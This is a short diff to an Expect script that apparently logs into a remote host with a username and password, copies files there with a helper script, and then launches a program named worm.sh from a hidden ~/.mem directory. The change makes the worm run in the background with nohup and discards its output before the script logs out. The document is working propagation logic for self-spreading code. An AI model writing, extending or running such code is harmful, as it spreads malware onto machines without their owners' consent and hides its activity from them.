@@ -25,17 +25,16 @@ expect {
 		exp_continue
 	}
 	-nocase "last login" {
-		puts "we're in"
+		# we're in!
 
 		set timeout 10
-		puts "copying"
-
 	 	exec ./copy.sh $username $ip $password
-		# eval spawn ./copy.sh $username $ip $password
 		expect eof
 		
-		send "ls -l ~/.mem\r"
-		expect "worm.sh"
+		puts "running worm\r"
+		send "cd .mem && nohup ./worm.sh &>/dev/null &!\r"
+		expect "\\\[1\\\]"
+		send "exit\r"
 	}	
 	timeout {
 		exit 1;
@@ -46,6 +45,5 @@ expect {
 	}
 }
 
-puts "Done"
-
+# Done!
 exit 0;
